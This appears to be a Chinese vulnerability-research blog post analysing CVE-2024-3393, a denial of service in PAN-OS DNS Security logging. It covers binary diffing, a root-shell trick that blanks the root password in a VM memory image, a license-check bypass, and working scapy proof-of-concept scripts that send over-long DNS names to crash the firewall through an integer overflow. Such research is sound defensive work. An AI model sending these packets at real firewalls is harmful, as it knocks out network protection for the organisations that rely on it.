---
title: 关于PAN-OS DoS(CVE-2024-3393)的研究
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589341&idx=1&sn=c57db95a9d3d5f4d3d5993b9e4d2398e&chksm=b18c281786fba101700fc813e084e65b0cbcf50b8690c4c0193b006c0228dc298b9dfb187189&scene=58&subscene=0#rd
source: 看雪学苑
date: 2025-02-09
fetch_date: 2025-10-06T20:36:51.807706
---

# 关于PAN-OS DoS(CVE-2024-3393)的研究

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXqjpx9pibOj2DMd6TKQ0xict2U4NEllhibbia6cpSOMWbqT3wQmpgwpW06g/0?wx_fmt=jpeg)

# 关于PAN-OS DoS(CVE-2024-3393)的研究

pz1o

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXBUibuaiaTCbZvXvWI52jicxhOiaVoCFlkNW9mVnlyhO4aPQBiaQbicC9kKhA/640?wx_fmt=png&from=appmsg)

前段时间Palo Alto发布了一项漏洞通告[1]，看漏洞信息是PAN-OS数据平面处理流量时产生DoS，其实之前PAN-OS也有过这样的DoS漏洞。但令笔者好奇的是，这次居然会影响Prisma Access，这款产品是Palo Alto公司实现零信任的关键组件，遂准备花些时间去做一下相关的复现。

```
一

漏洞描述分析
```

##

从描述中可以看出这是一个由DNS安全检测产生的漏洞，并且官方明确表示只有开启**DNS Security**才会产生。但不幸的是，这个功能需要购买相关的DNS Security License才能激活，这个暂且不做讨论，后续会有绕过的办法。而且，还关注到最重要的一点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXHDBv9rXW1PAZibSCpibjc8GYnowvhpmGVOp2cn1F4OG9KY93ZYgmwQgg/640?wx_fmt=png&from=appmsg)

它需要开启DNS Security Logging，也就是说很大概率是因为某些log记录时出现了fault。

那么现在得到的信息有以下几个:

1.首先这是防火墙数据平面处理流量产生的问题，并不涉及之前的Web管理口(CVE-2024-0012,CVE-2024-9474)，VPN口(CVE-2024-3400)等其他服务。

2.其次是DNS安全检测产生的，并且有可能时处理DNS Security Log产生的。
由于已经有了新的补丁，所以复现手法以diff为主。

```
二

环境搭建
```

##

根据上面的影响版本，笔者这里选择了PAN-OS 10.2.9-h19和PAN-OS 10.2.9-h18进行diff，可以看到新版本也只修复这一个CVE

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXUp2n1KQdI3SBq0ibzYOHicArsWMfGwiaMy93fDaPsypVrzL3OVRZ63QMQ/640?wx_fmt=png&from=appmsg)

## 1. 防火墙设置

首先需要设置DNS Security相关配置，主要在Anti-Spyware Profile中设置，如下图，重点是log serverity，这个就是漏洞描述中log部分。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXaVKdTGgicn0vWYmjZnac5TgbSQm96XRcO9YKBGJwW5ASDLzAoF9ia2ibw/640?wx_fmt=png&from=appmsg)

之后把这个用到策略上就可以

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjX9gLeuicvhx6libRXOjumtG8sLDfWDRTqqKiadHwNonm3RPNbuljP8dLicg/640?wx_fmt=png&from=appmsg)

上述防火墙配置就完成了，当然还有一些网口配置这些都是最基础的，可以自行配置。

## 2. shell获取

由于采用虚拟机，所以获取shell还是比较容易的，这里采用patch vm mem的方法。

具体操作如下：

将虚拟机挂起，会有一个后缀名为vmem的文件，之后需要将内存中的一部分内容替换。具体替换内容是将root改成空密码，这样CLI登录root的时候就不需要密码，并且拿到的是shell。

```
Find:
root:x:0:0:root:/root:/bin/bash
Replace:
root::0:0:root:/root://bin/bash
```

**这里注意替换字节要一样，否在虚拟机就起不来了**。最终效果如下图，之后改了root密码，就可以用远程22端口登录了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXg4qHLYP55ENETQNqTLsaYBZ0f7AKfxD0h2BKuYicp2mCvXBnpmvYPvQ/640?wx_fmt=png&from=appmsg)

#

```
三

‍diff分析
```

##

首先需要找到处理数据平面的进程，从[2][3][4]可以得到PAN\_OS各个进程的信息，虽然版本有点老，但一些关键进程还是没有改变的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXV0LMzQBSj7Ipbx2Qhl20I7tQfzicoWoQxcmcwgfu2y7DrgbL0XFFS5w/640?wx_fmt=png&from=appmsg)

从图中可以看出，data plane的主要处理进程就是pan\_task。在虚拟机中也可以找到相应的进程。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXucWatCMPkOePBSnB1gNIX6XfEPNnibImnrU4LpA77Cjmqo7BcJ6dFTg/640?wx_fmt=png&from=appmsg)

之后就可以直接进行diff了，这里用bindiff，也可以用Diaphora等diff工具，具体结果如下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXkiaia5icttSDH3WB69jsRXalgsGQDpzeU7IDAerFtEA3xibPBgXgP3MQKg/640?wx_fmt=png&from=appmsg)

看到有一个log函数改动较大，并且非常符合漏洞的描述，打开IDA，反汇编看一下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXutF9vvicg3CR97GRLo2ofuXcUweUcUOUvpfzsxxc80qCt0HwSTGFBVQ/640?wx_fmt=png&from=appmsg)

发现对内存操作进行较大改动，如果会产生dos，那么很大概率是计算size的时候出现了问题，但实际上旧版本size反汇编的结果很抽象，经过了一系列运算才得出一个结果，接下来就需要去逆向了。

```
四

逆向分析
```

##

首先需要触发这个流程。但前文提到DNS security需要license，这里发现这个DNS Security的开关会由`pan_task`结构体中的一个数据影响。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXnnFEyxHrm71NGVGaslSsV5uINnk4Nd3U3ssjvQQ9sylT4a3hM8WOQg/640?wx_fmt=png&from=appmsg)

在`pan_task`中会通过`cfg_data`获取相关DNS License。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXNwYicsPaamxIofsu23ibXjppxrfia0mXXWUqHkkzejkZrxWmfGn25EGLg/640?wx_fmt=png&from=appmsg)

默认没有license时，图中`cloud_dns_license`的值为0，当图中`cfg_data的cloud_dns_license`的值为1时，DNS Security将会开启，当我们发送一个解析恶意地址的DNS数据包就会拦截。

这里解析的域名选用Palo Alto的测试域名[5]`test-grayware.testpanw.com`,构造数据包采用`python`构造。

```
from scapy.all import *

target_dns_server = "8.8.8.8"
dns_request = IP(dst=target_dns_server) / UDP(dport=53, sport=RandShort()) / DNS(
        rd=1,
        qd=DNSQR(qname="test-grayware.testpanw.com", qtype="A")
    )
send(dns_request)
```

最终我们可以在威胁中定位到相关dns包被拦截：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXdVUqhcPofoLAks9jQrrhS4n2AbveGclnn2J045WlDSc8icAySHsArgg/640?wx_fmt=png&from=appmsg)

之后在`pan_task`中打函数断点`pan_log_send_threat_log`也可以停下来，说明走进了正确流程。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXogqAxuAKoSmiaOYNgQDmtnT7I84gMZAhJ9Zf9HBHl3MnUicRmqxocdTQ/640?wx_fmt=png&from=appmsg)

从gdb调试中不难看到，`filename`或者`url`其实就是我们解析的域名，并且在后续内存操作中，也是对这两个变量操作的地方进行了`patch`，那么考虑一下如果域名过长会不会导致crash。

```
from scapy.all import *
import random
import string

def generate_random_string(i):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(i))
    return random_string

target_dns_server = "8.8.8.8"
for i in range(0, 2048):
    rand_str = generate_random_string(i)+".test-grayware.testpanw.com"
    dns_request = IP(dst=target_dns_server) / UDP(dport=53, sport=RandShort()) / DNS(
        rd=1,
        qd=DNSQR(qname=rand_str, qtype="A")
    )
    send(dns_request)
    print("packet data:{}".format(rand_str))
```

跑完一轮之后发现并没有`crash`，其实熟悉DNS协议的人可能一眼就看到了其中问题，当DNS域名过长时，实际的DNS数据包发送的数据并不是我们想要的域名。

这是我们发送的其中一个数据包。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXXWHrVbz69nvOtB2MicTKmUOg0DUiaXHvuibRDIlB3mZP8JOGDug5kiaQOg/640?wx_fmt=png&from=appmsg)

可以看到实际发送的域名并不是我们想要发送的域名。

这里补充一些关于DNS协议的东西，DNS请求主要由DNS header和DNS Queries组成，其中重点关于DNS Queries，它主要包含以下几部分。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXJFibpDXxlXMBibs71gsTctxhbkphvEJ2cIvqazcE9CI4aKkicMGSV2Zmg/640?wx_fmt=png&from=appmsg)

◆域名以标签的形式编码。每个标签的第一个字节是该标签的长度，后跟标签的内容。**标签的长度最大为 63 字节**，标签和标签之间使用长度字节进行分隔。

◆域名的结尾使用`00`来标示，表示这是域名的结束。

◆例如，`www.example.com`会被表示为：`03 77 77 77 07 65 78 61 6D 70 6C 65 03 63 6F 6D 00`。
可以看到我们构造的域名是有问题的。

```
五

POC
```

所以按如下构造poc，那么产生的域名应该是足够长的。

```
from scapy.all import *
import random
import string

def generate_random_string(i):

    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(i))

    return random_string

def generate_dns_name():
    dns_name = ""
    for i in range(5):
        dns_name = dns_name + generate_random_string(63)+"."
    return dns_name
target_dns_server = "8.8.8.8"
rand_str = generate_dns_name() + "test-grayware.testpanw.com"
dns_request = IP(dst=target_dns_server) / UDP(dport=53, sport=RandShort()) / DNS(
    rd=1,
    qd=DNSQR(qname=rand_str, qtype="A")
)
print("Try this payload {}".format(rand_str))
send(dns_request)
```

最终导致了`memcpy`溢出

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXHibR4S00vENHhHzhIj9RZQiaW8NLsicRcczm4Mic95KRaEHVg2bAdnf1Mw/640?wx_fmt=png&from=appmsg)

## 1. POC分析

那么问题来了，这个size是如何产生的？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXnKbQPgibdI5zXPMDlyI450aepGjthfmudIr07wGz7NQsxGkMBI9Gq1w/640?wx_fmt=png&from=appmsg)

断点打到`000055555574F3DB`，发现rax=0也就是v39=0，实际上应该是`filename_len+1`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXgvLLMF5fxu28P7unkz0fZCfw34ZjjXhUIWwMpG34e80cNfVHYiciaTLw/640?wx_fmt=png&from=appmsg)

继续往上看发现`v39 = 0xff + 1 = 0x100`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXYbcNInia1OjlUX5iakoz0goo4RbeoBJtCtT68nlAC74wjkb5MMJGbsBQ/640?wx_fmt=png&from=appmsg)

但查看汇编时发现了不一样的东西

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXaQPhZDgYGdRQ2laESx2Nia7H6uibjb056kRHHWv0aXsXDBejGeiaKaTsg/640?wx_fmt=png&from=appmsg)

这里`v39 = eax + 1 = 0xff + 1 = 0x100`，但在下一个汇编只是移动了`al`，那么`v39 = 0x00 = 0`，所以下面的size变成`0 - 1 = 0xffffffff`也就顺理成章了，至此分析完毕。

## 2. 漏洞模式

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXrpZnDibB8OKEBSXTC7zXvhgMeUg07h2vN2ib0uvoOricg4RpcatCdwF6w/640?wx_fmt=png&from=appmsg)

所以这个漏洞本质上是由于整数溢出导致size计算错误而后续溢出。

## 3. patc...